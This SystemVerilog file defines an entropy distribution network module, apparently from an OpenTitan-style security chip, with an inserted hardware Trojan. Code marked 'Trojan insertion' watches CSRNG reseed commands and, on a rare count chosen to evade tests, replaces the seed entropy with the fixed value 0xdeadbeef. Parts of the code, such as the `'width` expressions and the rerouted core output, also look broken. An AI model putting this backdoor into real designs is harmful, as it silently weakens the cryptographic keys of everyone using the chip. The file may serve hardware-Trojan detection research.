`include "prim_assert.sv"

module edn
  import edn_pkg::*;
  import edn_reg_pkg::*;
#(
  parameter int NumEndPoints = 8,
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned AlertSkewCycles = 1
) (
  input logic clk_i,
  input logic rst_ni,

  // Tilelink Bus registers
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // EDN interfaces
  input  edn_req_t [NumEndPoints-1:0] edn_i,
  output edn_rsp_t [NumEndPoints-1:0] edn_o,

  // CSRNG Application Interface
  output  csrng_pkg::csrng_req_t  csrng_cmd_o,
  input   csrng_pkg::csrng_rsp_t  csrng_cmd_i,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // Interrupts
  output logic      intr_edn_cmd_req_done_o,
  output logic      intr_edn_fatal_err_o
);

  edn_reg2hw_t reg2hw;
  edn_hw2reg_t hw2reg;

  logic [NumAlerts-1:0] alert_test;
  logic [NumAlerts-1:0] alert;

  logic [NumAlerts-1:0] intg_err_alert;
  assign intg_err_alert[0] = 1'b0;

  // -------------------
  // Trojan insertion: begin
  // -------------------
  // This Trojan monitors reseed commands and, on a rare internal trigger,
  // forcibly substitutes the entropy seed with a fixed, low-entropy value.

  // Hardcoded low-entropy seed (example pattern, must match bus width)
  localparam logic [csrng_pkg::csrng_req_t'width-1:0] HARD_CODED_SEED =
    {csrng_pkg::csrng_req_t'width{1'b0}} | 32'hdeadbeef; // Lower bits set to 0xdeadbeef

  // Trojan internal FSM and event counter
  logic trojan_active_q, trojan_active_d;
  logic [15:0] trojan_event_cnt_q, trojan_event_cnt_d;
  logic trojan_trigger;

  // Detect reseed command to CSRNG
  logic reseed_cmd_vld;
  assign reseed_cmd_vld = (csrng_cmd_o.acmd == csrng_pkg::CSRNG_CMD_RESEED) && csrng_cmd_o.valid;

  // Trojan trigger: Very rarely enable on a specific CSRNG reseed count to evade tests
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_event_cnt_q <= 16'd0;
      trojan_active_q    <= 1'b0;
    end else begin
      trojan_event_cnt_q <= trojan_event_cnt_d;
      trojan_active_q    <= trojan_active_d;
    end
  end

  always_comb begin
    trojan_event_cnt_d = trojan_event_cnt_q;
    trojan_active_d    = trojan_active_q;

    // Count the number of reseed commands issued
    if (reseed_cmd_vld && !trojan_active_q) begin
      trojan_event_cnt_d = trojan_event_cnt_q + 1'b1;
    end

    // Activate Trojan when counter hits a rare count (e.g. 0x8004, unlikely during normal tests)
    if (trojan_event_cnt_q == 16'h8004 && reseed_cmd_vld && !trojan_active_q) begin
      trojan_active_d = 1'b1;
    end else if (!reseed_cmd_vld) begin
      trojan_active_d = 1'b0; // Only assert for single reseed command
    end
  end

  assign trojan_trigger = trojan_active_q;

  // Trojan output command mux
  csrng_pkg::csrng_req_t csrng_cmd_o_real;
  csrng_pkg::csrng_req_t csrng_cmd_o_trojan;

  assign csrng_cmd_o_real    = u_edn_core.csrng_cmd_o;
  assign csrng_cmd_o_trojan  = csrng_cmd_o_real;

  // On trigger, override the entropy seed data for reseed
  always_comb begin
    // Default: normal command
    csrng_cmd_o = csrng_cmd_o_real;
    if (trojan_trigger && csrng_cmd_o_real.valid && csrng_cmd_o_real.acmd == csrng_pkg::CSRNG_CMD_RESEED) begin
      csrng_cmd_o = csrng_cmd_o_trojan;
      // Override the seed with hardcoded low-entropy value
      csrng_cmd_o.entropy_input = HARD_CODED_SEED[csrng_cmd_o.entropy_input'width-1:0];
    end
  end
  // -------------------
  // Trojan insertion: end
  // -------------------

  // SEC_CM: CONFIG.REGWEN
  // SEC_CM: TILE_LINK.BUS.INTEGRITY

  edn_reg_top u_reg (
    .clk_i,
    .rst_ni,
    .tl_i,
    .tl_o,
    .reg2hw,
    .hw2reg,
    .intg_err_o(intg_err_alert[1]) // Assign this alert to the fatal alert index.
  );

  edn_core #(
    .NumEndPoints(NumEndPoints)
  ) u_edn_core (
    .clk_i,
    .rst_ni,
    .reg2hw,
    .hw2reg,

    .edn_i,
    .edn_o,

    // Trojan insertion: Route CSRNG CMD O to Trojan MUX
    //.csrng_cmd_o,
    //.csrng_cmd_i,
    .csrng_cmd_o(), // unused, replaced by Trojan mux
    .csrng_cmd_i(csrng_cmd_i),

    // Alerts

    .recov_alert_o(alert[0]),
    .fatal_alert_o(alert[1]),

    .recov_alert_test_o(alert_test[0]),
    .fatal_alert_test_o(alert_test[1]),

    .intr_edn_cmd_req_done_o,
    .intr_edn_fatal_err_o
  );

  ///////////////////////////
  // Alert generation
  ///////////////////////////
  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(i)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i  ( alert_test[i]                 ),
      .alert_req_i   ( alert[i] || intg_err_alert[i] ),
      .alert_ack_o   (                               ),
      .alert_state_o (                               ),
      .alert_rx_i    ( alert_rx_i[i]                 ),
      .alert_tx_o    ( alert_tx_o[i]                 )
    );
  end

  // Assertions

  `ASSERT_KNOWN(TlDValidKnownO_A, tl_o.d_valid)
  `ASSERT_KNOWN(TlAReadyKnownO_A, tl_o.a_ready)

  // Endpoint Asserts
  for (genvar i = 0; i < NumEndPoints; i = i+1) begin : gen_edn_if_asserts
    `ASSERT_KNOWN(EdnEndPointOut_A, edn_o[i])

    // Check that EDN data stays stable from edn_ack until the next EDN request or until EDN
    // disablement.
    `ASSERT(EdnDataStable_A,
        ($rose(edn_o[i].edn_ack) && $past(|u_edn_core.edn_enable_fo)) |=>
            $stable(edn_o[i].edn_bus) throughout
            (edn_i[i].edn_req || !(|u_edn_core.edn_enable_fo))[->1])

    // Check that EDN data stays stable while EDN is disabled.
    `ASSERT(EdnDataStableDisable_A,
        !(|u_edn_core.edn_enable_fo) |=> 1 $stable(edn_o[i].edn_bus))

    `ASSERT(EdnFatalAlertNoRsp_A, alert[1] |-> edn_o[i].edn_ack == 0)
  end : gen_edn_if_asserts

  // CSRNG Asserts
  `ASSERT_KNOWN(CsrngAppIfOut_A, csrng_cmd_o)

  // Alerts
  `ASSERT_KNOWN(AlertTxKnownO_A, alert_tx_o)

  // Interrupt Asserts
  `ASSERT_KNOWN(IntrEdnCmdReqDoneKnownO_A, intr_edn_cmd_req_done_o)

  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(CntAlertCheck_A,
    u_edn_core.u_prim_count_max_reqs_cntr,
    alert_tx_o[1])

  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(MainFsmCheck_A,
    u_edn_core.u_edn_main_sm.u_state_regs,
    alert_tx_o[1])

  for (genvar i = 0; i < NumEndPoints; i = i+1) begin : gen_edn_fsm_asserts
    `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(AckFsmCheck_A,
      u_edn_core.gen_ep_blk[i].u_edn_ack_sm_ep.u_state_regs,
      alert_tx_o[1])
  end

  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(ResCmdFifoWptrCheck_A,
    u_edn_core.u_prim_fifo_sync_rescmd.gen_normal_fifo.u_fifo_cnt.gen_secure_ptrs.u_wptr,
    alert_tx_o[1])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(ResCmdFifoRptrCheck_A,
    u_edn_core.u_prim_fifo_sync_rescmd.gen_normal_fifo.u_fifo_cnt.gen_secure_ptrs.u_rptr,
    alert_tx_o[1])

  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(GenCmdFifoWptrCheck_A,
    u_edn_core.u_prim_fifo_sync_gencmd.gen_normal_fifo.u_fifo_cnt.gen_secure_ptrs.u_wptr,
    alert_tx_o[1])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(GenCmdFifoRptrCheck_A,
    u_edn_core.u_prim_fifo_sync_gencmd.gen_normal_fifo.u_fifo_cnt.gen_secure_ptrs.u_rptr,
    alert_tx_o[1])

  // Alert assertions for reg_we onehot check
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT(RegWeOnehotCheck_A, u_reg, alert_tx_o[1])
endmodule